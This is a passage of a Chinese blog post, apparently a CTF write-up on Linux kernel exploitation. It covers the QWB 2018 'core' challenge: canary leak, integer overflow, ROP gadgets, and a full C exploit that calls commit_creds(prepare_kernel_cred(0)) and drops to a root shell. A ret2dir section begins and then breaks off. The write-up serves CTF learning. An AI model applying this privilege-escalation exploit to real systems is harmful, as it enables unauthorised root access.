

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="peiwithhao">
  <meta name="keywords" content="">
  
    <meta name="description" content="针对不同内核漏洞的n种提权方案">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux-Kernel-0x02-Practice">
<meta property="og:url" content="https://peiandhao.github.io/2023/06/24/Linux-Kernel-0x02-Practice/index.html">
<meta property="og:site_name" content="peiwithhao&#39;s Valhalla">
<meta property="og:description" content="针对不同内核漏洞的n种提权方案">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://peiandhao.github.io/img/Linux_Kernel.png">
<meta property="article:published_time" content="2023-06-24T12:59:35.000Z">
<meta property="article:modified_time" content="2023-06-30T10:10:03.423Z">
<meta property="article:author" content="peiwithhao">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="kernel">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://peiandhao.github.io/img/Linux_Kernel.png">
  
  
  
  <title>Linux-Kernel-0x02-Practice - peiwithhao&#39;s Valhalla</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"peiandhao.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"text"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"Afm6UeM0VL6RfMOLAgwtyxs8-gzGzoHsz","app_key":"Vr60qrZIptqhJaXqWvDEknkH","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>p3ivv1+h@0</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/Linux_Kernel.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Linux-Kernel-0x02-Practice"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        peiwithhao
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-06-24 20:59" pubdate>
          2023年6月24日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          43k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          361 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Linux-Kernel-0x02-Practice</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="一-Kernel-ROP"><a href="#一-Kernel-ROP" class="headerlink" title="一  Kernel ROP"></a>一  Kernel ROP</h1><p>其大致思想类似于<code>userland</code>部分的ROP，唯一区别就是咱们需要注意现场的保存与还原即可:)</p>
<h2 id="例题：强网杯2018-core"><a href="#例题：强网杯2018-core" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h2><h3 id="0-反编译代码分析"><a href="#0-反编译代码分析" class="headerlink" title="0. 反编译代码分析"></a>0. 反编译代码分析</h3><p>文件里面包含了这几个文件<br>        <code>bzImage</code>,<code>core.cpio</code>,<code>start.sh</code>,<code>vmlinux</code><br>先看看start.sh</p>
<pre><code class="hljs">qemu-system-x86_64 \
-m 128M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \
-s \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
</code></pre>
<p>可以看到咱们这儿题目采用了kaslr ，有地址随机，所以咱们需要泄露地址，大致思路和用户态一致。这里还注意那就是从ctfwiki上面下载下来的题目是-m 64M,这里会出现运行不了虚拟机的情况，所以咱们改为128M即可，这是内存大小的定义，太小了跑不动。</p>
<p>之后咱们再看看文件系统解压后得到的init脚本</p>
<pre><code class="hljs">#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mv exp.c /
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms &gt; /tmp/kallsyms
echo 1 &gt; /proc/sys/kernel/kptr_restrict
echo 1 &gt; /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko
#setsid /bin/cttyhack setuidgid 0 /bin/sh

poweroff -d 120 -f &amp;
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo &#39;sh end!\n&#39;
umount /proc
umount /sys

poweroff -d 0  -f
</code></pre>
<p>从中我们可以看到文件系统中insmod了一个core.ko，一般来讲这就是漏洞函数了，还有咱们可以添加<code>setsid /bin/cttyhack setuidgid 0 /bin/sh</code>这一句来使得我们进入虚拟机的时候就是root权限，大伙不必惊慌，这里是因为咱们是再本地需要进行调试，所以init脚本任我们改，start脚本也是，咱们可以直接把kalsr关了也行，但关了并不代表咱们不管，咱们这一举动主要是为了方便调试的，最终打远程还是人家说了算，咱们值有一个exp能提交。<br>接着分析init，这里还发现开始时内核符号表被复制了一份到<code>/tmp/kalsyms</code>中，利用这个我们可以获得内核中所有函数的地址，还有个恶心的地方那就是这里开启了定时关机，咱们可以把这给先注释掉<br><code>poweroff -d 120 -f &amp;</code></p>
<p>进入漏洞模块的分析</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/42166d224f4a20a438bb7e05d5529822730ed04f.jpg" srcset="/img/loading.gif" lazyload></p>
<p>这里可以看到有canary和NX，所以咱们通过ROP的话需要进行canary泄露。<br>接下来咱们分析相关函数init_moddule</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/a9d3fd1f4134970ac9d052edd0cad1c8a6865d55.jpg" srcset="/img/loading.gif" lazyload></p>
<p>可以看到模块加载的初期会创建一个名为<code>core</code>的进程，在虚拟机中在&#x2F;proc目录下<br>在看看比较重要的ioctl函数</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d162f5ed8a3b6deb48f8d546453.jpg" srcset="/img/loading.gif" lazyload></p>
<p>可以看出有三个模式选择，分别点入相关函数看</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/77094b36acaf2edd18640b2bc81001e93801935f.jpg" srcset="/img/loading.gif" lazyload></p>
<p>这里的read函数就是向用户指定的地址从off偏移地址写入64个字节.<br>而从ioctl中第二个case可以看到咱们居然可以设置off，所以我们可以通过设置偏移来写入canary的值，而我们从ida中可以看到咱们的canary是位于这里</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/a5c27d1ed21b0ef40362da9c98c451da80cb3e6d.jpg" srcset="/img/loading.gif" lazyload></p>
<p>可以知道相差对于v5相差0x40，所以咱们设置的off也是0x40</p>
<p>我们还可以来看看file_operations,(不秦楚的大伙可以看看我的上一篇环境搭建的文章)，可以看到他只实现了write，ioctl，release的系统调用：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/50da81cb39dbb6fd4da7a7e44c24ab18962b3777.jpg" srcset="/img/loading.gif" lazyload></p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/6d81800a19d8bc3e40f74408c78ba61ea9d34571.jpg" srcset="/img/loading.gif" lazyload></p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/7aec54e736d12f2e7ffceca20ac2d56284356873.jpg" srcset="/img/loading.gif" lazyload></p>
<p>我们再来看看其他函数，先看core_write</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/8694a4c27d1ed21b193c6c27e86eddc450da3f7e.jpg" srcset="/img/loading.gif" lazyload><br>这里可以知道他总共可以向name这个地址写入0x800个字节，心动<br>我们再来看看ioctl中第三个选项的core_copy_func</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/810a19d8bc3eb135c137f579e31ea8d3fc1f4404.jpg" srcset="/img/loading.gif" lazyload><br>发现他可以从name上面拷贝数据到达栈上，然后这个判断存在着整形溢出，这里如果咱传个负数就可以达成效果了。</p>
<p>既然咱们可以在栈上做手脚，那么我们就可以利用ROP的方式了，首先找几个gadget，这里的gadget是需要在vmlinux中寻找，我的推荐是用</p>
<pre><code class="hljs">objdump -d ./vmlinux &gt; ropgadget \
cat ropgadget | grep &quot;pop rdi; ret&quot;
</code></pre>
<p>这样的类型进行寻找</p>
<h3 id="1-寻找gadget"><a href="#1-寻找gadget" class="headerlink" title="1.寻找gadget"></a>1.寻找gadget</h3><p>如图：<br>对于上面所说的比较关键的两个函数<code>commit_creds</code>以及<code>prepare_kernel_cred</code>,我们在vmlinux中去寻找他所加载的的地址<br>然后我们可以看看ropgadget文件<br><img src="http://imgsrc.baidu.com/super/pic/item/aec379310a55b319d78ccdb706a98226cefc17fe.jpg" srcset="/img/loading.gif" lazyload><br>从中咱们可以看到其中即我们所需要的gadget(实际上就是linux内核镜像所使用的汇编代码)，此时我们再通过linux自带的grep进行搜索，个人认为还是比较好用的，用<code>ropgadget</code>或者是<code>ropper</code>来说都可以，看各位师傅的喜好来.具体使用情况如下：<br><img src="http://imgsrc.baidu.com/super/pic/item/b8389b504fc2d562427a9f2fa21190ef77c66c86.jpg" srcset="/img/loading.gif" lazyload><br>以此手法获得两个主要函数的地址后，此刻若咱们在exp中获得这两个函数的实际地址，然后将两者相减即可得到KASLR的偏移地址。<br>自此咱们继续搜索别的gadget，我们此刻需要的gadget共有如下几个：</p>
<pre><code class="hljs">swapgs; popfq;  ret;
mov rdi, rax;  call rdx; 
pop rdx; ret;  
pop rdi; ret;   
pop rcx; ret; 
iretq
</code></pre>
<p>师傅们可以用上述方法自行寻找.</p>
<h3 id="2-自行构造返回状态"><a href="#2-自行构造返回状态" class="headerlink" title="2. 自行构造返回状态"></a>2. 自行构造返回状态</h3><p>虽然咱们的<strong>提权</strong>是在内核态当中，但我们最终还是需要返回用户态来得到一个root权限的shell，所以当我们进行栈溢出rop之后还需要利用swapgs等保存在内核栈上的寄存器值返回到应得的位置，但是如何保证返回的时候不出错呢，对，那就只能在调用内核态的时候将即将保存的正确的寄存器值先保存在咱们自己申请的值里面，这样就方便咱们在rop链结尾填入他们实现返回不报错。既然涉及到了保存值，那我们就需要内嵌汇编代码来实现此功能，代码如下，这也可以视为一个通用代码；</p>
<pre><code class="hljs">size_t user_cs, user_ss,user_rflags,user_sp;

//int fd = 0;        // file pointer of process &#39;core&#39;

void saveStatus()&#123;
  __asm__(&quot;mov user_cs, cs;&quot;
          &quot;mov user_ss, ss;&quot;
          &quot;mov user_sp, rsp;&quot;
          &quot;pushf;&quot;
          &quot;pop user_rflags;&quot;
          );
  puts(&quot;\033[34m\033[1m Status has been saved . \033[0m&quot;);
&#125;
</code></pre>
<p>大伙学到了内核pwn，那汇编功底自然不必说，我就不解释这段代码功能了。</p>
<h3 id="3-攻击思路"><a href="#3-攻击思路" class="headerlink" title="3. 攻击思路"></a>3. 攻击思路</h3><p>现在开始咱们的攻击思路思考，在上面介绍各个函数的时候我也稍微讲了点。我们所做的事主要如下：</p>
<blockquote>
<ol>
<li><p>利用ioctl中的选项2.修改off为0x40</p>
</li>
<li><p>利用core_read,也就是ioctl中的选项1,可将局部变量v5的off偏移地址打印,经过调试可发现这里即为canary</p>
</li>
<li><p>当咱们打印了canary,现在即可进行栈溢出攻击了,但是溢出哪个栈呢,我们发现ioctl的第三个选项中调用的函数 <code>core_copy_func</code>,会将bss段上的name输入在栈上,输入的字节数取决于咱们传入的数字,并且此时他又整型溢出漏洞,好,就决定冤大头是他了</p>
</li>
<li><p>core.ko 所实现的系统调用write可以发现其中可以将我们传入的值写到bss段中的name上面,天助我也,所以咱们就可以在上面适当的构造rop链进行栈溢出了</p>
</li>
</ol>
</blockquote>
<p>大伙看到这里是不是觉得有点奇怪,欸,刚才不是说要泄露地址码,这兄弟是不是讲错了,就这?大家不要慌,我这正要讲解,从上面的init脚本中我们可以看到这一句:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>kallsyms &gt; <span class="hljs-regexp">/tmp/</span>kallsyms<br></code></pre></td></tr></table></figure>

<p>其中 &#x2F;proc&#x2F;kallsyms中包含了内核中所有用到的符号表,而处于用户态的我们是不能访问的,所以出题人贴心的将他输出到了&#x2F;tmp&#x2F;kallsyms中,这就使得我们在用户态也依然可以访问了,所以我们还得在exp中写一个文件遍历的功能,当然这对于学过系统编程的同学并不在话下,(可是我上这课在划水….)<br>这里贴出代码给大伙先看看</p>
<pre><code class="hljs">void get_function_address()&#123;
        FILE* sym_table = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);        // including all address of kernel functions,just like the user model running address.
        if(sym_table == NULL)&#123;
                printf(&quot;\033[31m\033[1m[x] Error: Cannot open file \&quot;/tmp/kallsyms\&quot;\n\033[0m&quot;);
                exit(1);
        &#125;
        size_t addr = 0;
        char type[0x10];
        char func_name[0x50];
        // when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.
        while(fscanf(sym_table, &quot;%llx%s%s&quot;, &amp;addr, type, func_name))&#123;
                if(commit_creds &amp;&amp; prepare_kernel_cred)                // two addresses of key functions are all found, return directly.
                        return;
                if(!strcmp(func_name, &quot;commit_creds&quot;))&#123;                // function &quot;commit_creds&quot; found
                        commit_creds = addr;
                        printf(&quot;\033[32m\033[1m[+] Note: Address of function \&quot;commit_creds\&quot; found: \033[0m%#llx\n&quot;, commit_creds);
                &#125;else if(!strcmp(func_name, &quot;prepare_kernel_cred&quot;))&#123;
                        prepare_kernel_cred = addr;
                        printf(&quot;\033[32m\033[1m[+] Note: Address of function \&quot;prepare_kernel_cred\&quot; found: \033[0m%#llx\n&quot;, prepare_kernel_cred);
                &#125;
        &#125;

&#125;
</code></pre>
<p>当知道exp思路之后,其他的一切就简单起来,只需要看懂他然后实现即可.</p>
<h3 id="4-gbb调试qemu中内核基本方法"><a href="#4-gbb调试qemu中内核基本方法" class="headerlink" title="4. gbb调试qemu中内核基本方法"></a>4. gbb调试qemu中内核基本方法</h3><p>众所周知,调试在pwn中是十分重要的,特别是动调,所以这里介绍下gdb调试内核的方法<br>由于咱们的内核是跑在qemu中,所以我们gdb需要用到远程调试的方法,但是如果直接连端口的话会出现没符号表不方便调试的,所以我们需要自行导入内核模块,也就是文件提供的<code>vmlinux</code>,之后由于咱们还需要core.ko的符号表,所以咱们也可以通过自行导入来获得可以,通过 <code>add-symbol-file core.ko textaddr</code> 加载 ,而这里的<code>textaddr</code>即为<code>core.ko</code>的<code>.text</code>段地址,我们可以通过修改<code>init</code>中为<code>root</code>权限进行设置.<br>这里.text 段的地址可以通过 <code>/sys/modules/core/section/.text</code> 来查看，<br>这里强烈建议大伙先关kaslr(通过在启动脚本修改,就是将kaslr改为nokaslr)再进行调试,效果图如下</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/5882b2b7d0a20cf48316b11d33094b36adaf996a.jpg" srcset="/img/loading.gif" lazyload><br>我们可以通过<code>-gdb tcp:port</code>或者 <code>-s </code>来开启调试端口，<code>start.sh</code> 中已经有了 -s，不必再自己设置。(对了如果-s ,他的功能等同于-gdb tcp:1234)<br>在我们获得.text基地址后记得用脚本来开gdb,不然每次都要输入这么些个东西太麻烦了,脚本如下十分简单:</p>
<pre><code class="hljs">#!/bin/bash
gdb -q \
  -ex &quot;&quot; \
  -ex &quot;file ./vmlinux&quot; \
  -ex &quot;add-symbol-file ./extract/core.ko 0xffffffffc0000000&quot; \
  -ex &quot;b core_copy_func&quot; \
  -ex &quot;target remote localhost:1234&quot; \
</code></pre>
<p>其中打断点可以先打在core_read,这里打在core_copy_func是我调到尾声修改的.这里还注意一个点,就是当采用pwndbg的时侯需要root权限才可以进行调试不然会出现以下错误</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/77094b36acaf2edd1b05062bc81001e938019378.jpg" srcset="/img/loading.gif" lazyload><br>最开始气死我了,人家peda都不要root,但是最开始不清楚为什么会错,我还以为是版本问题,但想到这是我最近刚配的一台机子又应该不是,其实最开始看到permission就该想到的,害.<br>我们用root权限进行开调</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/0824ab18972bd40717299c3f3e899e510eb30901.jpg" srcset="/img/loading.gif" lazyload alt="aa"><br>可以看到十分的成功,此刻我continue,还记得咱们下的断电码,b core_read,如果咱们调用它后咱们就会在这里停下来,此刻我们运行咱们的程序试试</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/b7003af33a87e950aaf6bcae55385343faf2b40b.jpg" srcset="/img/loading.gif" lazyload><br>这样咱们就可以愉快的进行调试啦,至此gdb调试内核基本方法到此结束~~~</p>
<h3 id="5-ROP链解析"><a href="#5-ROP链解析" class="headerlink" title="5. ROP链解析"></a>5. ROP链解析</h3><p>这里简单讲讲,直接给图</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/7c1ed21b0ef41bd5b84aa63614da81cb38db3dd2.jpg" srcset="/img/loading.gif" lazyload><br>相信大家理解起来不费力.</p>
<h3 id="6-exp"><a href="#6-exp" class="headerlink" title="6. exp"></a>6. exp</h3><p>本次exp如下,大伙看看</p>
<pre><code class="hljs">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;ctype.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/ioctl.h&gt;

size_t commit_creds = NULL, prepare_kernel_cred = NULL;        // address of to key function
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RDI_RET 0xffffffff81000b2f  
#define POP_RCX_RET 0xffffffff81021e53
#define IRETQ 0xffffffff81050ac2 
size_t user_cs, user_ss,user_rflags,user_sp;

//int fd = 0;        // file pointer of process &#39;core&#39;

/*void saveStatus();
void get_function_address();
#void core_read(int fd, char* buf);
void change_off(int fd, long long off);
void core_copy_func(int fd, long long nbytes);
void print_binary(char* buf, int length);
void shell();
*/
void saveStatus()&#123;
  __asm__(&quot;mov user_cs, cs;&quot;
          &quot;mov user_ss, ss;&quot;
          &quot;mov user_sp, rsp;&quot;
          &quot;pushf;&quot;
          &quot;pop user_rflags;&quot;
          );
  puts(&quot;\033[34m\033[1m Status has been saved . \033[0m&quot;);
&#125;

void core_read(int fd, char *addr)&#123;
  printf(&quot;try read\n&quot;);
  ioctl(fd,0x6677889B,addr);
  printf(&quot;read done!&quot;);
&#125;

void change_off(int fd, long long off)&#123;
  printf(&quot;try set off \n&quot;);
  ioctl(fd,0x6677889C,off);
&#125;

void core_copy_func(int fd, long long nbytes)&#123;
  puts(&quot;try cp\n&quot;);
  ioctl(fd,0x6677889A,nbytes);
&#125;

void get_function_address()&#123;
        FILE* sym_table = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);        // including all address of kernel functions,just like the user model running address.
        if(sym_table == NULL)&#123;
                printf(&quot;\033[31m\033[1m[x] Error: Cannot open file \&quot;/tmp/kallsyms\&quot;\n\033[0m&quot;);
                exit(1);
        &#125;
        size_t addr = 0;
        char type[0x10];
        char func_name[0x50];
        // when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.
        while(fscanf(sym_table, &quot;%llx%s%s&quot;, &amp;addr, type, func_name))&#123;
                if(commit_creds &amp;&amp; prepare_kernel_cred)                // two addresses of key functions are all found, return directly.
                        return;
                if(!strcmp(func_name, &quot;commit_creds&quot;))&#123;                // function &quot;commit_creds&quot; found
                        commit_creds = addr;
                        printf(&quot;\033[32m\033[1m[+] Note: Address of function \&quot;commit_creds\&quot; found: \033[0m%#llx\n&quot;, commit_creds);
                &#125;else if(!strcmp(func_name, &quot;prepare_kernel_cred&quot;))&#123;
                        prepare_kernel_cred = addr;
                        printf(&quot;\033[32m\033[1m[+] Note: Address of function \&quot;prepare_kernel_cred\&quot; found: \033[0m%#llx\n&quot;, prepare_kernel_cred);
                &#125;
        &#125;
&#125;


void shell()&#123;
        if(getuid())&#123;
                printf(&quot;\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m&quot;);
                exit(1);
        &#125;
        printf(&quot;\033[32m\033[1m[+] Getting the root......\033[0m\n&quot;);
        system(&quot;/bin/sh&quot;);
        exit(0);
&#125;

int main()&#123;
  saveStatus();
  int fd = open(&quot;/proc/core&quot;,2);              //get the process fd
  if(!fd)&#123;
                printf(&quot;\033[31m\033[1m[x] Error: Cannot open process \&quot;core\&quot;\n\033[0m&quot;);
                exit(1);
        &#125;
  char buffer[0x100] = &#123;0&#125;;
        get_function_address();                // get addresses of two key function
  ssize_t vmlinux = commit_creds - commit_creds;            //base address
  printf(&quot;vmlinux_base = %x&quot;,vmlinux);
  //get canary 
  size_t canary;
  change_off(fd,0x40);
  //getchar();
  
  core_read(fd,buffer);
  canary = ((size_t *)buffer)[0];
  printf(&quot;canary ==&gt; %p\n&quot;,canary);
  //build the ROP
  size_t rop_chain[0x1000] ,i= 0;
  printf(&quot;construct the chain\n&quot;);
  for(i=0; i&lt; 10 ;i++)&#123;
    rop_chain[i] = canary;
  &#125;
  rop_chain[i++] = POP_RDI_RET + vmlinux ; 
  rop_chain[i++] = 0;
  rop_chain[i++] = prepare_kernel_cred ;          //prepare_kernel_cred(0)
  rop_chain[i++] = POP_RDX_RET + vmlinux;
  rop_chain[i++] = POP_RCX_RET + vmlinux;
  rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + vmlinux;
  rop_chain[i++] = commit_creds ;
  rop_chain[i++] = SWAPGS_POPFQ_RET + vmlinux;
  rop_chain[i++] = 0;
  rop_chain[i++] = IRETQ + vmlinux;
  rop_chain[i++] = (size_t)shell;
  rop_chain[i++] = user_cs;
  rop_chain[i++] = user_rflags;
  rop_chain[i++] = user_sp;
  rop_chain[i++] = user_ss;
  write(fd,rop_chain,0x800);
  core_copy_func(fd,0xffffffffffff0100); 
&#125;
</code></pre>
<h3 id="7-编译运行"><a href="#7-编译运行" class="headerlink" title="7. 编译运行"></a>7. 编译运行</h3><p>这里哟个小知识,那就是在被攻击的内核中一般不会给你库函数,所以咱们需要用gcc中的-static参数进行静态链接,然后就是为了支持内嵌汇编代码,所以我们需要使用<code>-masm=intel</code>,这里intel也可以换amd,看各位汇编语言用的啥来进行修改.我这里用的把保存状态代码是intel支持的.</p>
<pre><code class="hljs">gcc test.c -o test -static -masm=intel -g
</code></pre>
<p>将此编译得到的二进制文件打包近文件系统然后重新启动,情况如图</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/faf2b2119313b07e6cb81eca49d7912396dd8cef.jpg" srcset="/img/loading.gif" lazyload></p>
<h5 id="成功提权"><a href="#成功提权" class="headerlink" title="成功提权!!!!!"></a><strong>成功提权!!!!!</strong></h5><h1 id="二-Kernel-ret2dir"><a href="#二-Kernel-ret2dir" class="headerlink" title="二 Kernel ret2dir"></a>二 Kernel ret2dir</h1><h2 id="0-ret2dir原理"><a href="#0-ret2dir原理" class="headerlink" title="0.ret2dir原理"></a>0.ret2dir原理</h2><p>ret2dir的存在是为了解决SMAP&#x2F;SMEP保护模式的一种手法，该保护模式是阻止了内核程序执行用户程序，第一次被提出是在14年的一篇论文，这里页给出链接</p>
<p><a target="_blank" rel="noopener" href="https://cs.brown.edu/~vpk/papers/ret2dir.sec14.pdf">ret2dir原论文</a><br>首先我们得知道一下Linux内存中的基本布局，链接如下，有兴趣的同学可以自行观看</p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.0/source/Documentation/x86/x86_64/mm.txt">Linux 内存布局</a></p>
<p>我们可以看到有以下一个区域</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 